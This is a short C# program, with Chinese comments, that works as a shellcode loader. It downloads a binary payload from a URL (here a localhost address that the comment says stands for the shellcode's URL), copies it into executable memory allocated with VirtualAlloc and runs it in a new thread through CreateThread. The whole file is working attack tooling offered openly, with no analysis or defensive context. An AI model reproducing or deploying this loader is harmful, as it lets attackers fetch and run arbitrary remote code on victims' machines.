using System;
using System.Net;
using System.Runtime.InteropServices;

namespace HttpReadFileLoadShellcode
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        static void Main(string[] args)
        {
            WebClient client = new WebClient();
            byte[] shellcodeBytes = client.DownloadData("http://127.0.0.1:7741/pt.bin"); //Url即是Shellcode的URL
            IntPtr shellcodePtr = VirtualAlloc(IntPtr.Zero, (uint)shellcodeBytes.Length, 0x1000, 0x40);
            Marshal.Copy(shellcodeBytes, 0, shellcodePtr, shellcodeBytes.Length);// 复制到内存
            IntPtr threadHandle = IntPtr.Zero;
            IntPtr threadId = IntPtr.Zero;
            threadHandle = CreateThread(IntPtr.Zero, 0, shellcodePtr, IntPtr.Zero, 0, ref threadId);// 创建线程执行Shellcode
            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    }
}
